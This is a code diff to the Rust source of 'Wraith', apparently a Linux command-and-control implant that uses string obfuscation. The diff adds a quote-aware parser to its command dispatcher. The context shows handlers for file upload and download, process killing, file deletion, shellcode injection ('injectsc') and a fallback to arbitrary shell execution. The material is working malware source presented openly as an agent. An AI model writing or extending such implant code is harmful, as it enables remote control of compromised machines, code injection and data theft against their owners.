@@ -291,25 +291,56 @@ fn get_privilege_info() -> String {
 #[cfg(not(target_os = "linux"))]
 compile_error!("Wraith is a Linux-only agent. Build with: cargo build --target=x86_64-unknown-linux-musl");
 
+fn parse_command(cmd: &str) -> Vec<String> {
+    let mut parts = Vec::new();
+    let mut current = String::new();
+    let mut in_quote = false;
+    let mut quote_char = ' ';
+    let mut chars = cmd.chars().peekable();
+    
+    while let Some(c) = chars.next() {
+        if !in_quote && (c == '"' || c == '\'') {
+            in_quote = true;
+            quote_char = c;
+        } else if in_quote && c == quote_char {
+            in_quote = false;
+            quote_char = ' ';
+        } else if !in_quote && c.is_whitespace() {
+            if !current.is_empty() {
+                parts.push(current.clone());
+                current.clear();
+            }
+        } else {
+            current.push(c);
+        }
+    }
+    
+    if !current.is_empty() {
+        parts.push(current);
+    }
+    
+    parts
+}
+
 async fn execute_command(cmd_str: &str) -> String {
-    let parts: Vec<&str> = cmd_str.trim().split_whitespace().collect();
+    let parts = parse_command(cmd_str.trim());
     if parts.is_empty() {
         return obfstr::obfstr!("empty command").to_string();
     }
 
-    let command = parts[0];
-    let args = &parts[1..];
+    let command = parts[0].as_str();
+    let args: Vec<&str> = parts[1..].iter().map(|s| s.as_str()).collect();
 
     match command {
-        "ls" => handle_ls(args).await,
-        "cd" => handle_cd(args).await,
-        "get" => handle_get(args).await,
-        "put" => handle_put(args).await,
+        "ls" => handle_ls(&args).await,
+        "cd" => handle_cd(&args).await,
+        "get" => handle_get(&args).await,
+        "put" => handle_put(&args).await,
         "ps" => handle_ps().await,
-        "kill" => handle_kill(args).await,
-        "rm" => handle_rm(args).await,
-        "rmdir" => handle_rmdir(args).await,
-        "injectsc" => handle_inject_sc(args).await,
+        "kill" => handle_kill(&args).await,
+        "rm" => handle_rm(&args).await,
+        "rmdir" => handle_rmdir(&args).await,
+        "injectsc" => handle_inject_sc(&args).await,
         _ => handle_shell(cmd_str).await,
     }
 }
